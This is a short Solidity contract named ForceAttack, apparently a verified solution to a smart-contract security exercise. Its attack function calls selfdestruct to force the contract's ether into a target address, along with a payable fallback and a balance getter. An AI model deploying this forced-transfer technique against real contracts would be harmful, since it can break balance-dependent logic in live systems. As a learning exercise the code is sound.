/**
 *Submitted for verification at Etherscan.io on 2021-10-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    
    constructor() payable {
        
    }
    
    event Log(uint gas);
    
    function attack(address payable _contractAddress) public {
        selfdestruct(_contractAddress);
    }
    
   fallback() external payable {
       
        emit Log(gasleft());
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    
}